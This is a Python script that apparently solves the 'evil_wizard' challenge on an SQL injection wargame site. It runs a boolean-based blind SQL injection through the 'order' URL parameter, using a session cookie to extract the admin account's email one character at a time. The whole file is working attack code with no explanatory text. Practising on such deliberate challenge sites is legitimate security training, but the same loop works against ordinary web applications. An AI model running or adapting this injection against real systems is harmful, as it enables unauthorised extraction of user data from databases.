import requests

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order="
session = {'PHPSESSID':'1pnndupij0939bhhc7o1etb71b'}
payload2 = ""


for i in range(1,31):
    for j in range(45,123):
        payload="if(id=%27admin%27%20and%20(ord(substr(email,"+str(i)+",1)))="+str(j)+",1,2)"
        #print(str(i)+" payload = "+url+payload)
        
        request = requests.post(url+payload, cookies=session)
        if "<td>50</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.com</td><td>100</td>" in request.text:
            flag = 0
            break
        else:
            flag = 1
            continue
    payload2 = payload2 + chr(j)
    print(payload2)
print("DONE!!"+payload2)

